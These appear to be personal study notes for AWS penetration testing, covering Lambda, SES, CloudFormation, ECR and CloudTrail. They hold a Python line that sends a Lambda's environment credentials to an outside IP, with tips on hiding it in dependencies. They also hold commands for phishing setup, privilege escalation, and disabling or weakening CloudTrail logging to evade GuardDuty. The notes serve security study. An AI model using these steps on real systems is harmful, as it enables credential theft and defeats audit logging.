<h2 id="bf7b4a28-7320-41d9-8951-9fe961258311" class="">Lambda Malicious Code</h2><ul id="fd53fa4c-bcef-46a6-b7ed-b3623db0090e" class="bulleted-list"><li style="list-style-type:disc">Python <code>requests</code>library not one of the default Lambda libraries, but this can be imported via the <code>botocore</code> package<ul id="4556588f-f13c-4ae8-abaf-e21a3a7fe9e9" class="bulleted-list"><li style="list-style-type:circle"><code>from botocore.vendored import requests</code><pre id="4a6c8c45-9a9d-4da7-9cd9-a58c1139be28" class="code"><code>from botocore.vendored import requests
requests.post(&#x27;http://1.1.1.1&#x27;, json=os.environ.copy(), timeout=0.01)
</code></pre></li></ul></li></ul><ul id="a4af4357-5c86-489d-89f4-17457414356c" class="bulleted-list"><li style="list-style-type:disc">ensure the malicious code is wrapped in a <code>try</code> and <code>except</code> to avoid errors from showing up in the logs</li></ul><ul id="eceacc68-8962-42e7-bccb-e75981433c1e" class="bulleted-list"><li style="list-style-type:disc">be aware of the Lambda function’s timeout </li></ul><ul id="5275ce82-3d6a-49e1-b8d9-43e672886223" class="bulleted-list"><li style="list-style-type:disc">it is much better and stealthier to insert malicious code into the function’s used dependencies, rather than to the function’s code itself<ul id="ba2846f0-ea2a-4cf2-887d-da2ec68bd876" class="bulleted-list"><li style="list-style-type:circle">export Lambda function to .zip file, and then reupload it with modified dependencie</li></ul><p id="98156df3-e30f-40d9-9598-b71658c2d621" class="">
</p></li></ul>
<h1 id="5022f87c-d43a-44f2-8b49-857db225c5d1" class="">Chapter 14: Targeting Other Services</h1><ul id="e7cfb4e1-94aa-4947-90d4-fd9fae23c561" class="bulleted-list"><li style="list-style-type:disc">exploitation of Route 53, Simple Email Service (SES), CloudFOrmation, and Elastic Container Registry (ECR)</li></ul>
<h2 id="1ec2c8fe-c487-4f86-9df9-88687e4f5775" class="">Route 53</h2><ul id="0d1f363d-63a8-46e5-92ed-2849ceba5a4d" class="bulleted-list"><li style="list-style-type:disc">route 53 is a scalable DNS/domain management service</li></ul><ul id="7fa3ad67-c93e-4d7a-8909-4fe291fd830e" class="bulleted-list"><li style="list-style-type:disc">good to use for recon<ul id="04c111d0-df0b-4304-a4e1-3a4c5cecdc0e" class="bulleted-list"><li style="list-style-type:circle">allows association of IPs and host names, </li></ul><ul id="e8a3b8ac-500f-4564-8d88-78ba9b4d17b3" class="bulleted-list"><li style="list-style-type:circle">can discover domains and sub-domains</li></ul></li></ul><ul id="affe9b31-96f8-4aa5-92ae-2195db793906" class="bulleted-list"><li style="list-style-type:disc">other than for recon, Route53 is not useful for pentesters (too disruptive)</li></ul>
<h3 id="4986a9c7-dc27-432b-a690-04d74da4653f" class="">How Malicious Attackers Exploit Route53</h3><ul id="a99121b0-d7ee-4897-8678-3639d3f6f9ee" class="bulleted-list"><li style="list-style-type:disc">change DNS records to point to their web server</li></ul><ul id="0b84aff3-61b8-4c54-bae6-83e75a093b99" class="bulleted-list"><li style="list-style-type:disc">route DNS queries between different networks and VPC<ul id="d4dbf755-5cf1-47e9-8658-18b4d2781adc" class="bulleted-list"><li style="list-style-type:circle">can provide insight into other networks not hosted within AWS, or can give insight into other services within VPCs</li></ul></li></ul>
<h2 id="83de59df-0f89-48a0-a908-4b4225ca6bf1" class="">Simple Email Service (SES)</h2><ul id="8b011a46-5233-4fe3-af06-8f7e87a4259e" class="bulleted-list"><li style="list-style-type:disc">good to use for phishing </li></ul><ul id="f1aaa724-a256-457d-acdc-94ef41c0bef2" class="bulleted-list"><li style="list-style-type:disc">if a policy is attached to an SES identity, then it has restrictions<ul id="d1819445-83a7-4e67-86ce-e5bf521f83cc" class="bulleted-list"><li style="list-style-type:circle">permissive SES identities do not have any policies attached to them</li></ul><ul id="37eab232-d861-4e79-8b59-486963373c66" class="bulleted-list"><li style="list-style-type:circle"><code>aws ses list-identity-policies --identity test@test.com</code></li></ul></li></ul><ul id="3aff38db-3542-45fe-a4cc-c64bd957cd32" class="bulleted-list"><li style="list-style-type:disc">to get a policy, you can use <code>aws ses get-identity-policies --identity &lt;IDENTITY&gt; --policy-name &lt;POLICY&gt;</code><ul id="8b746403-6cbc-49e1-afc0-f6565d26f786" class="bulleted-list"><li style="list-style-type:circle">example output:</li></ul><pre id="d4a673da-c421-4f53-a8ed-24138d89db62" class="code"><code>{
	&quot;Version&quot;: &quot;2008-10-17&quot;,
	&quot;Statement&quot;: [
		{
			&quot;Sid&quot;: &quot;stmt1242527116212&quot;,
			&quot;Effect&quot;: &quot;Allow&quot;,
			&quot;Principal&quot;: {
			&quot;AWS&quot;: &quot;arn:aws:iam::000000000000:user/ExampleAdmin&quot;
			},
		&quot;Action&quot;: &quot;ses:SendEmail&quot;,
		&quot;Resource&quot;: &quot;arn:aws:ses:us-west-2:000000000000:identity/admin@example.com&quot;
		}
	]
}</code></pre></li></ul><ul id="e0de82a7-9bbf-4344-b39f-b4c2d0da73d3" class="bulleted-list"><li style="list-style-type:disc">can update SES identity policy with <code>aws ses put-identity-policy --identity </code><code><a href="mailto:admin@example.com">admin@example.com</a></code><code> --policy-name &lt;POLICY_NAME&gt; --policy file://modified_policy.json</code><ul id="f9eac271-3250-4c68-8621-17b11951bdb6" class="bulleted-list"><li style="list-style-type:circle">SES supports cross-account email sending</li></ul></li></ul><ul id="2a516001-263e-417e-95bf-1bf43e3379cb" class="bulleted-list"><li style="list-style-type:disc">as long as account not in SES sandbox (and is verified and enabled), you can send emails to any account outside of the email’s domain<ul id="5e5bbc6b-32ae-4e55-a3cd-c606fa69884d" class="bulleted-list"><li style="list-style-type:circle">otherwise phishing can only be performed against other emails with the same domain </li></ul></li></ul><ul id="2d212f65-ea87-4499-aa55-b5b5054f2af6" class="bulleted-list"><li style="list-style-type:disc">templates within environment can be found with <code>aws ses list-templates</code> and <code>aws ses get-template --template-anme &lt;TEMPLATE_NAME&gt;</code></li></ul>
<h2 id="2054acd0-5ce6-4ebd-9ae8-83fa13b8bd99" class="">CloudFormation</h2><ul id="dde448d9-867b-4146-8186-157198b82405" class="bulleted-list"><li style="list-style-type:disc">can suffer from hardcoded secrets, overly permissive deployments, etc.</li></ul><p id="666d8f9f-9a2c-426c-8b40-5f9be1f663a4" class=""><code>aws cloudformation describe-stacks</code>:</p>
<h3 id="6a8a7193-151d-4644-a417-1b7e6e94c4b8" class="">Stack Parameters</h3><ul id="9938f019-5511-44aa-9e45-eb237af9bf7d" class="bulleted-list"><li style="list-style-type:disc">some sensitive information can show up if <code>NoEcho</code> is not set to <code>true</code><pre id="c9c2d776-dfc6-4271-bb08-e5cd23683db8" class="code"><code>&quot;Parameters&quot;: [
	{
		&quot;ParameterKey&quot;: &quot;KeyName&quot;,
		&quot;ParameterValue&quot;: &quot;MySSHKey&quot;
	},
	{
		&quot;ParameterKey&quot;: &quot;DBPassword&quot;,
		&quot;ParameterValue&quot;: &quot;aPassword2!&quot;
	},
	{
		&quot;ParameterKey&quot;: &quot;SSHLocation&quot;,
		&quot;ParameterValue&quot;: &quot;0.0.0.0/0&quot;
	},
	{
		&quot;ParameterKey&quot;: &quot;DBName&quot;,
		&quot;ParameterValue&quot;: &quot;CustomerDatabase&quot;
	},
	{
		&quot;ParameterKey&quot;: &quot;DBUser&quot;,
		&quot;ParameterValue&quot;: &quot;****&quot;
	},
	{
		&quot;ParameterKey&quot;: &quot;InstanceType&quot;,
		&quot;ParameterValue&quot;: &quot;t2.small&quot;
	}
]</code></pre><ul id="b4691090-25d4-45b5-be03-262d1ecfcfaa" class="bulleted-list"><li style="list-style-type:circle">upon being set to true, the parameter value will be censored with <code>*</code> characters<ul id="94fe903a-f460-4946-afde-f9aa061af06c" class="bulleted-list"><li style="list-style-type:square">note that <code>DBUser</code> may or may not have a password 4 characters long. Password constraints should be checked by viewing the template for the stack</li></ul></li></ul></li></ul>
<h3 id="b46d740e-f9de-4edb-898c-b1dab7b4977f" class="">Stack Output Values</h3><ul id="142af7e9-4037-4922-95f9-8f50b8e7c38d" class="bulleted-list"><li style="list-style-type:disc">essentially the same thing as parameters, but these values were generated during the creation of the stack</li></ul><ul id="535fefe0-8241-4260-bbc0-727529703e36" class="bulleted-list"><li style="list-style-type:disc">can potentially have access keys such as if a template creates an IAM user with an access key pair</li></ul>
<h3 id="aa105aaa-d64f-4db8-9188-03e1dd66e880" class="">Stack Termination Protection</h3><ul id="d8b747ae-6645-4b6a-82bf-f22491774d93" class="bulleted-list"><li style="list-style-type:disc">termination protection provides additional protection against the termination of a CloudFormation stack<ul id="f4f75834-f725-4cd7-b68f-740f9a8f6d05" class="bulleted-list"><li style="list-style-type:circle">this requires that you first disable the stack, then delete a stack which requires a different set of permissions</li></ul></li></ul><ul id="e67b5beb-0d60-4b2b-96c1-20bbe0e066b9" class="bulleted-list"><li style="list-style-type:disc">cannot be leveraged as an attacker, but it is good practice</li></ul>
<p id="fca8d7cc-3088-4e6f-afe5-f6d786e0470c" class="">To check this you can run <code>aws cloudformation describe-stacks --stack-name &lt;STACK_NAME&gt;</code></p><div class="indented"><ul id="e0fe4848-c543-43af-8cc5-2bf7a18f6022" class="bulleted-list"><li style="list-style-type:disc"><code>EnableTerminationProtection</code> will be set to <code>true</code> or <code>false</code></li></ul></div>
<h3 id="78b59128-9d3a-452f-b1c1-c26041a7aa9b" class="">Deleted Stacks</h3><p id="a985aaec-70e1-47f8-bdae-8739b48df93d" class=""><code>aws cloudformation list-stacks</code>
<div class="indented"><ul id="d1dc1b0c-a21a-4aab-a8e5-c2fcab4bd51d" class="bulleted-list"><li style="list-style-type:disc">shows all stacks (even deleted ones)</li></ul></div></p><p id="4bcfec5d-86e9-4716-a3c6-b0a5003d8887" class=""><code>aws cloudformation describe-stacks --stack-name arn:aws:cloudformation:us-west-2:000000000000:stack/&lt;DELETED_STACK&gt;/23801r22-906h-53a0-pao3-74yre14208z6</code>
<div class="indented"><ul id="22056c02-cbe1-4382-8309-3e0c3097c8dd" class="bulleted-list"><li style="list-style-type:disc">shows parameters and output values of the stack <ul id="75e89d92-b900-4510-bc79-bdce2933d1ae" class="bulleted-list"><li style="list-style-type:circle">note that deleted stacks must be referenced by their ARN</li></ul></li></ul></div></p>
<h3 id="d6e35598-1622-4d88-9d97-52ff25157dd0" class="">Stack Exports</h3><ul id="8025524c-682c-4679-850c-1f271ff20be3" class="bulleted-list"><li style="list-style-type:disc">exports share output values between stacks without the need to reference them<ul id="281a4e42-d2c0-4a2d-89b0-1ac44ff9e5a0" class="bulleted-list"><li style="list-style-type:circle">exported values are also shown under the outputs of the stacks</li></ul></li></ul><ul id="af824e21-8fcb-49ab-b0d9-d41efbe66beb" class="bulleted-list"><li style="list-style-type:disc">exports can help give info about target environment and/or the user cases of the stack</li></ul><p id="ca26dfb3-cfe0-482b-bd34-933247e28c13" class=""><code>aws cloudformation list-exports</code>
<div class="indented"><ul id="73c825a6-1d4d-4fc7-b0ee-89da951ade51" class="bulleted-list"><li style="list-style-type:disc">shows name and value of each export and the stack that exported it</li></ul></div></p>
<h3 id="d40e19e2-8f22-4c24-bcfb-c1ba4fbdd8e9" class="">Stack Templates</h3><p id="c69a23d1-26dd-4ca7-a025-7995877bacb5" class=""><code>aws cloudformation get-template --stack-name &lt;STACK_NAME&gt;</code></p><ul id="8d71777e-e278-4286-9c89-893ceaf5496a" class="bulleted-list"><li style="list-style-type:disc">contains information regarding the setup of various resources<ul id="35c4294c-802e-442f-9314-6db47f6ed55d" class="bulleted-list"><li style="list-style-type:circle">can help identify resources, misconfigurations, hardcoded secrets, etc.</li></ul></li></ul>
<h3 id="1d267d7a-9b31-41ba-9994-ca796b4b6b4e" class="">Passed Roles</h3><ul id="a8fac4d0-97d9-43f4-a6d0-f561aec7da7e" class="bulleted-list"><li style="list-style-type:disc">stacks can be passed with other roles using <code>iam:PassRole</code></li></ul><ul id="1e45d024-f9a1-4a25-8864-bdcfd1049b60" class="bulleted-list"><li style="list-style-type:disc">an IAM user with <code>cloudformation:*</code> can escalate privileges by modifying other higher-privileged stacks</li></ul><ul id="a2e2f4b4-3341-48e1-aa8f-ec97f9a6022f" class="bulleted-list"><li style="list-style-type:disc">stacks with passed roles can be identified if a stack’s ARN has the <code>RoleARN</code> key with the value of an IAM role’s ARN<ul id="443a9f37-1ba0-42f6-b917-f1b8e7fc8efe" class="bulleted-list"><li style="list-style-type:circle">role’s permissions can be inferred by its name, via the resources that the stack deployed, and the stack’s template</li></ul></li></ul><p id="94926bf1-5bb9-40f5-adb4-4c7ef3b41b8b" class=""><code>aws cloudformation describe-stack-resources --stack-name &lt;STACK_NAME&gt;</code>
<div class="indented"><ul id="0bf3eb8f-9bff-46e8-a501-e2999b02bb22" class="bulleted-list"><li style="list-style-type:disc">shows what resources were created by the stack</li></ul></div></p><p id="54bbdd93-46d8-4912-8379-23139ddced1f" class=""><code>aws cloudformation update-stack --stack-name &lt;STACK_NAME&gt; --template-body file://template.json --parameters file://params.json</code>
<div class="indented"><ul id="2d7e20d5-fe35-4ecb-85c5-e1641cb7cc23" class="bulleted-list"><li style="list-style-type:disc">updates stack with modified template that can for example perform additional API calls on behalf of the role’s permissions attached to the stack (essentially a privesc)</li></ul></div></p>
<h3 id="cbd3483d-84fe-466b-9ef9-1c79f11cad0e" class="">Discovering values of NoEcho Parameters</h3><ul id="fc248418-6b38-4d5a-b49c-f4d262eaf527" class="bulleted-list"><li style="list-style-type:disc"><code>cloudformation:UpdateStack</code> is needed to uncover <code>NoEcho</code> values<ul id="b8fc94a0-522f-4f21-874b-9ea07fc594da" class="bulleted-list"><li style="list-style-type:circle">note that as a pentester, you should also have <code>cloudformation:GetTemplate</code></li></ul><ul id="daae485e-0107-466f-93cf-59a6280d6ef4" class="bulleted-list"><li style="list-style-type:circle">it is possible to retrieve the value for <code>NoEcho</code> parameters with just <code>UpdateStack</code>, but this requires updating a template with our own which would result in the loss of resources that the stack created (because we are essentially completely replacing the previously used template instead of modifying it)</li></ul></li></ul>
<h2 id="15ff50bf-22a4-4438-bae7-b49dda5fb022" class="">Elastic Container Registry (ECR)</h2><ul id="9d49e7bf-a917-4894-b7c6-808b9c339c1d" class="bulleted-list"><li style="list-style-type:disc">fully managed Docker container service for deploying, storing, and managing Docker container images</li></ul><ul id="2028cc18-341f-4caf-a533-765843261a8f" class="bulleted-list"><li style="list-style-type:disc">it may be possible to escalate privileges by logging into the container registry and pulling a docker image</li></ul>
<h1 id="51498d5b-d478-4ec0-9632-96483456aadc" class="">Chapter 15: Pentesting CloudTrail</h1>
<h2 id="2696625f-5ab0-471d-88ed-2d5161c16a52" class="">Auditing</h2><p id="2be7c722-97d5-4672-a556-6c1fb90abb5d" class="">The following keys should be set to <code>true</code> within CloudTrail:</p><table id="37e5ba7e-bf37-4f13-a120-95ccd25ede60" class="simple-table"><tbody><tr id="9b81966f-4ccb-49dd-b1a1-504b7a1c2043"><td id="N`&lt;g" class="" style="width:201px"><strong>Key</strong></td><td id="I}fK" class="" style="width:272px"><strong>Description</strong></td><td id="I}fK" class="" style="width:222px"><strong>Additional Info</strong></td></tr><tr id="949a1111-af4c-4a53-a8e0-996b8ebaca61"><td id="N`&lt;g" class="" style="width:201px"><code>IsMultiRegional</code></td><td id="I}fK" class="" style="width:272px">Ensures CloudTrail is logging across all regions</td><td id="I}fK" class="" style="width:222px">This is more efficient than creating individual trails for each region; additionally, new AWS regions get released.</td></tr><tr id="57ca1328-e3a3-46ad-951f-715013cf9667"><td id="N`&lt;g" class="" style="width:201px"><code>IncludeGlobalServiceEvents</code></td><td id="I}fK" class="" style="width:272px">Logs API activity for non-region specific AWS services (e.g. IAM and S3)</td><td id="I}fK" class="" style="width:222px"></td></tr><tr id="cc423fbb-b810-4481-9e1e-3f41cc54a7d9"><td id="N`&lt;g" class="" style="width:201px"><code>LogFileValidationEnabled</code> </td><td id="I}fK" class="" style="width:272px">Identify deletion/modification of logs</td><td id="I}fK" class="" style="width:222px"></td></tr><tr id="9f6dedbb-46c8-40e5-a017-cf4e20a3dab1"><td id="N`&lt;g" class="" style="width:201px"><code>KMSKeyId</code></td><td id="I}fK" class="" style="width:272px">The key used to encrypt the logs</td><td id="I}fK" class="" style="width:222px">Absence of this key means that the logs are not encrypted</td></tr></tbody></table><ul id="4f2b0178-294c-446a-93e9-9aeb5cea1b0d" class="bulleted-list"><li style="list-style-type:disc">if <code>HasCustomEventSelectors</code> is <code>true</code> then perform the following command to view which events are being logged:<p id="14e39cdb-ae40-4a6e-adb3-5a7ed96eb07c" class=""><code>aws cloudtrail get-event-selectors --trail-name &lt;TRAIL_NAME&gt;</code></p></li></ul><ul id="073ce24d-f1ad-453d-8f83-dbfef54639a4" class="bulleted-list"><li style="list-style-type:disc">to see if the trail is enabled, perform the following command:<p id="4f92eca6-279f-425c-b879-0c335bc87651" class=""><code>aws cloudtrail get-trail-status --name &lt;TRAIL_NAME&gt;</code></p><ul id="84c664ef-7f68-4193-b526-a6dd812627b9" class="bulleted-list"><li style="list-style-type:circle">check if the <code>IsLogging</code> key is set to <code>true</code> </li></ul><ul id="69cbfd6f-8713-4f78-a2f8-73c1c2bcf099" class="bulleted-list"><li style="list-style-type:circle">make sure the values for <code>LatestDeliveryAttemptTime</code> and <code>LatestDeliveryAttemptSucceeded</code> are the same, otherwise there may be a problem when CloudTrail is delivering logs to S3 </li></ul></li></ul>
<h2 id="b0e11bc7-4b4b-4f67-9ec4-d02b7df4d020" class="">Recon</h2><ul id="8a9236fa-da7b-49bb-aef9-6ca93f0dcfc4" class="bulleted-list"><li style="list-style-type:disc">unlike CloudTrail logs, CloudTrail’s event history is immutable</li></ul><ul id="02243074-9fc6-4117-9456-39e38a140e4c" class="bulleted-list"><li style="list-style-type:disc">using <code>cloudtrail:LookupEvents</code> it is possible to view the event history of CloudTrail <ul id="1984175d-fe59-4434-9dc7-6aa82307df80" class="bulleted-list"><li style="list-style-type:circle">this way you can see CloudTrail events without needing S3 and KMS (if you do have S3 and KMS permissions be careful of downloading logs, it may be alarming)</li></ul><ul id="ab6adb82-2a95-4f05-b71a-7fcbdb7f2602" class="bulleted-list"><li style="list-style-type:circle">easier to stay stealthy when the usual activity of users/services is known </li></ul></li></ul><ul id="3f0d6c43-3ff2-4fda-acfe-561419626c2a" class="bulleted-list"><li style="list-style-type:disc"><code>LookUpEvents</code> is slow as it returns up to 50 events per-second (therefore, it is important to filter before downloading events from CloudTrail’s event history)</li></ul><p id="71a8fdc5-eca8-4357-a5c7-a12df0f2f368" class="">Example event history:</p><pre id="fa306b07-964d-463a-a82f-afb602e82599" class="code"><code>{
	&quot;eventVersion&quot;: &quot;1.06&quot;,
	&quot;userIdentity&quot;: {
		&quot;type&quot;: &quot;IAMUser&quot;,
		&quot;principalId&quot;: &quot;AIDARACQ1TW2RMLLAQFTX&quot;,
		&quot;arn&quot;: &quot;arn:aws:iam::000000000000:user/TestUser&quot;,
		&quot;accountId&quot;: &quot;000000000000&quot;,
		&quot;accessKeyId&quot;: &quot;ASIAQA94XB3P0PRUSFZ2&quot;,
		&quot;userName&quot;: &quot;TestUser&quot;,
		&quot;sessionContext&quot;: {
			&quot;attributes&quot;: {
				&quot;creationDate&quot;: &quot;2018-12-28T18:49:59Z&quot;,
				&quot;mfaAuthenticated&quot;: &quot;true&quot;
			}
		},
		&quot;invokedBy&quot;: &quot;signin.amazonaws.com&quot;
	},
	&quot;eventTime&quot;: &quot;2018-12-28T20:07:51Z&quot;,
	&quot;eventSource&quot;: &quot;cloudtrail.amazonaws.com&quot;,
	&quot;eventName&quot;: &quot;CreateTrail&quot;,
	&quot;awsRegion&quot;: &quot;us-east-1&quot;,
	&quot;sourceIPAddress&quot;: &quot;1.1.1.1&quot;,
	&quot;userAgent&quot;: &quot;signin.amazonaws.com&quot;,
	&quot;requestParameters&quot;: {
		&quot;name&quot;: &quot;ExampleTrail&quot;,
		&quot;s3BucketName&quot;: &quot;example-for-cloudtrail-logs&quot;,
		&quot;s3KeyPrefix&quot;: &quot;&quot;,
		&quot;includeGlobalServiceEvents&quot;: true,
		&quot;isMultiRegionTrail&quot;: true,
		&quot;enableLogFileValidation&quot;: true,
		&quot;kmsKeyId&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t&quot;,
		&quot;isOrganizationTrail&quot;: false
	},
	&quot;responseElements&quot;: {
		&quot;name&quot;: &quot;ExampleTrail&quot;,
		&quot;s3BucketName&quot;: &quot;example-for-cloudtrail-logs&quot;,
		&quot;s3KeyPrefix&quot;: &quot;&quot;,
		&quot;includeGlobalServiceEvents&quot;: true,
		&quot;isMultiRegionTrail&quot;: true,
		&quot;trailARN&quot;: &quot;arn:aws:cloudtrail:us-east-1:000000000000:trail/ExampleTrail&quot;,
		&quot;logFileValidationEnabled&quot;: true,
		&quot;kmsKeyId&quot;: &quot;arn:aws:kms:us-east-1:000000000000:key/4a9238p0-r4j7-103i-44hv-l457396t3s9t&quot;,
		&quot;isOrganizationTrail&quot;: false
	},
	&quot;requestID&quot;: &quot;a27t225a-4598-0031-3829-e5h130432279&quot;,
	&quot;eventID&quot;: &quot;173ii438-1g59-2815-ei8j-w24091jk3p88&quot;,
	&quot;readOnly&quot;: false,
	&quot;eventType&quot;: &quot;AwsApiCall&quot;,
	&quot;managementEvent&quot;: true,
	&quot;recipientAccountId&quot;: &quot;000000000000&quot;
}</code></pre><ul id="d8365043-dfd1-4430-9b6b-a21bf56d5c56" class="bulleted-list"><li style="list-style-type:disc"><code>signin.amazonaws.com</code> means the action was performed by the AWS web console </li></ul><ul id="f081cf36-e093-4b7b-9b15-b0cd717f4db5" class="bulleted-list"><li style="list-style-type:disc">make sure to change your user agent to match the <code>userAgent</code> value in the event history </li></ul>
<h2 id="84d246fe-bf2a-48cf-9c79-032f2febb934" class="">Bypassing Logging</h2>
<h3 id="ab180c25-2046-4d82-9d2e-7d62cd68705a" class="">Using Unsupported Services</h3><ul id="f1d17f01-b590-45a2-8de4-59926b987a82" class="bulleted-list"><li style="list-style-type:disc">API calls to unsupported services do not produce any logs in CloudTrail, including the Event history<ul id="b3b2fc09-90bb-496d-9d29-4774f7230a0a" class="bulleted-list"><li style="list-style-type:circle">furthermore, no CloudWatch event rules can be created for unsupported services</li></ul><ul id="55a4ebd4-6661-4055-a3e4-2def48bb488b" class="bulleted-list"><li style="list-style-type:circle">API calls to unsupported services can be leveraged to help determine whether a key pair is being used as a canary token</li></ul></li></ul><ul id="4559ac1a-e8fc-4957-9274-06cee61591f2" class="bulleted-list"><li style="list-style-type:disc">defenders should refrain from providing permissions to unsupported CloudTrail services unless absolutely necessary, if so then:<ul id="5b4b63de-615a-4780-9477-b9de25d9d64c" class="bulleted-list"><li style="list-style-type:circle">make use of any potential built-in logging within the unsupported service</li></ul><ul id="ccbcebf9-7955-47d7-8803-e1e936e68e76" class="bulleted-list"><li style="list-style-type:circle">view IAM credentialed reports to identify services that were accessed (<code>aws iam get-credential-report</code>), and perform <code>aws iam generate-service-last-accused-details --arn &lt;IAM_RESOURCE_ARN&gt;</code> to see which services a specific resource accessed (this return a <code>JobId</code> which can be viewed with <code>aws iam get-service-last-accessed-details --job-id &lt;JOB_ID&gt;</code>)<ul id="815bc0cd-3cdd-4a2f-a118-0803f64b4dc0" class="bulleted-list"><li style="list-style-type:square">note this does not show what activity a resource performed within the service, it only shows whether a resource successfully authenticated to a service and when</li></ul></li></ul></li></ul>
<h3 id="3082cb73-0c1d-4233-abcd-fc9fbb65fcba" class="">Cross-Account Enumeration</h3><p id="45159167-9b06-4b8f-98dc-5cfcc262ae1d" class=""><strong>User Enumeration</strong></p><ul id="8fdce3f1-dd53-417f-8337-1a75997036ec" class="bulleted-list"><li style="list-style-type:disc">requires knowing account ID of target</li></ul><ul id="ee3ebc49-575b-47ab-bdd4-aa4bda2f772c" class="bulleted-list"><li style="list-style-type:disc">use Pacu to enumerate users and roles (ensure that the creds provided have <code>iam:UpdateAssumeRolePolicy</code>, and that the creds are owned by your AWS account): 
<strong>Users
</strong><code>run iam__enum_users --account-id 123456789012 --role-name &lt;ATTACKER_CREATED_ROLE&gt;</code>, <p id="4cc9054c-0760-48dc-b810-3770b96aa437" class=""><strong>Roles</strong></p><p id="5153be38-640b-468f-8185-486dd90e8dec" class=""><code>run iam__enum_roles --account-id 123456789012 --role-name &lt;ATTACKER_CREATED_ROLE&gt;</code></p><ul id="6d5def68-76a7-43fc-90ef-e121a8158044" class="bulleted-list"><li style="list-style-type:circle">this module attempts to assume discovered roles which can be successful in case of a misconfiguration</li></ul></li></ul>
<h2 id="cd9f01bc-4018-4497-b9f6-76fb62ac3cc8" class="">Disrupting Trails</h2><ul id="1d045ca5-214b-4e08-b991-5eedc386fc73" class="bulleted-list"><li style="list-style-type:disc">any of the following methods can be performed with <code>run detetion_disruptions --trails &lt;TRAIL_NAME&gt;@&lt;AWS_REGION&gt;</code><ul id="d01b611b-88f7-4de9-a573-6337fc6fed25" class="bulleted-list"><li style="list-style-type:circle">you will then be prompted to minimize (weaken), disable, or delete the specified trail </li></ul></li></ul><ul id="4140ee15-d74a-44fd-84a2-a4305ae96c72" class="bulleted-list"><li style="list-style-type:disc">disruptions of CloudTrail will likely cause alarms, however it is possible to nevertheless stay under the radar if GuardDuty or other monitoring services are not implemented<ul id="86c5e1d8-c3a9-4462-bab7-7578ffe73513" class="bulleted-list"><li style="list-style-type:circle">GuardDuty will trigger an <code>Stealth:IAMUser/CloudTrailLoggingDisabled</code> alert upon disabling a trail, or <code>Stealth:IAMUser/LoggingConfigurationModified</code> upon modifying a trail’s configuration</li></ul></li></ul>
<h3 id="55f34295-1dc8-4824-b4e8-0ee6d7a977af" class="">Disabling a Trail</h3><p id="090fc40a-7cf7-4766-8697-aa3429b6b5ab" class=""><code>aws cloudtrail stop-logging --name &lt;TRAIL_NAME&gt;</code>
<div class="indented"><ul id="ac27527e-f13e-474c-9e93-00fb84aa8212" class="bulleted-list"><li style="list-style-type:disc">must be run from the same region as the trail to not have an <code>InvalidHomeRegionException</code> error</li></ul></div></p>
<h3 id="971a127f-8eac-4646-8ce7-12dac3ba76c5" class="">Deleting a Trail or its S3 Bucket</h3><ul id="393a82a7-4a46-429a-9348-68688e5b5555" class="bulleted-list"><li style="list-style-type:disc">can delete trail completely or S3 bucket that holds the logs</li></ul><p id="d00af9fd-8577-43d4-a2bf-99c14cf48713" class="">Deleting Trail:</p><p id="a1b51156-f6ab-4e0f-b069-ebd226ae333f" class=""><code>aws cloudtrail delete-trail --name &lt;TRAIL_NAME&gt;</code></p><p id="931240d8-8e02-463c-a937-ba7de22ef45d" class="">Deleting S3 Bucket:</p><ul id="b548b6d9-cf51-444c-8403-e195b48b7147" class="bulleted-list"><li style="list-style-type:disc">will leave trail in an error state</li></ul><ul id="7c9e964b-1470-4255-baec-90c835ecff28" class="bulleted-list"><li style="list-style-type:disc">find S3 bucket trail is sending logs to (view the <code>S3BucketName</code> 
key): </li></ul><p id="932b1993-3af5-4701-b4c0-fa84e5083986" class=""><code>aws cloudtrail describe-trails</code></p><ul id="d49355e5-aa04-4404-ad34-a6a4e7170bd7" class="bulleted-list"><li style="list-style-type:disc">delete bucket:</li></ul><p id="f158edd5-2cfc-48a4-9d23-f48315a95c70" class=""><code>aws s3api delete-bucket --bucket &lt;BUCKET_NAME&gt;</code></p>
<h3 id="dba2b150-e667-44d6-8215-b5d3c51ed40f" class="">Weakening a Trail or its S3 Bucket</h3><p id="3f9dda4c-a166-4f5d-a7e8-a8b56d24baf9" class="">Weakening a Trail:</p><ul id="1b38d6c4-ce0c-49c6-8fd4-4f5c497ebe43" class="bulleted-list"><li style="list-style-type:disc">use <code>cloutrail:UpdateTrail</code> to modify a trail’s monitoring configurations, and cause it to only monitor unimportant events that are unrelated to the specific attack</li></ul><p id="c0b1d2ca-ddd2-4895-86be-98e2b4311728" class="">Weakening Trail’s S3 Bucket Logging:</p><ul id="f9c2e266-5078-4a37-b023-1df1fc6f7b8e" class="bulleted-list"><li style="list-style-type:disc">requires the <code>cloudTrail:PutEventSelectors</code> permission</li></ul><ul id="aa5e676a-6473-43ae-ab83-ed9aa5863d80" class="bulleted-list"><li style="list-style-type:disc">modify event selectors to prevent the logging of certain types of events (such as by avoiding S3/Lambda logging by removing those services from the <code>DataResources</code> key in the event selector policy)<ul id="7dcb0ed9-2be7-4992-86ca-76a4a1a5bb63" class="bulleted-list"><li style="list-style-type:circle">can also modify <code>ReadWriteType</code> to avoid recording read or write events</li></ul></li></ul><p id="d39343da-fabf-4781-a228-8dae504a4d55" class=""><code>aws cloudtrail put-event-selectors --trail-name &lt;TRAIL_NAME&gt; --event-selectors file://weakened_event_selectors.json</code></p>
<h2 id="8e6a7be0-dc93-4d38-ae1a-931d3d2df94d" class="">Bypassing GuardDuty</h2><ul id="8d4d9c85-8c08-4870-8a00-31f625b05364" class="bulleted-list"><li style="list-style-type:disc">GuardDuty can potentially be bypassed if a user typically configures CloudTrail configurations<ul id="2ac0d0ba-4565-4c42-9a81-2e936740396c" class="bulleted-list"><li style="list-style-type:circle">identify usual activity of compromised user to avoid GuardDuty from being triggered</li></ul></li></ul><ul id="79c85d87-54a5-4950-a8e2-1c92c5869b29" class="bulleted-list"><li style="list-style-type:disc">modify certain logs from S3 bucket (works if log file validation is misconfigured)<ul id="7c0e0baa-7e7c-4924-a971-e633a4bc97c3" class="bulleted-list"><li style="list-style-type:circle">note that this activity will still be in CloudTrail’s event history, but CloudTrail’s event history is slow and has limitations (therefore this allows an attacker to buy some time)</li></ul></li></ul>

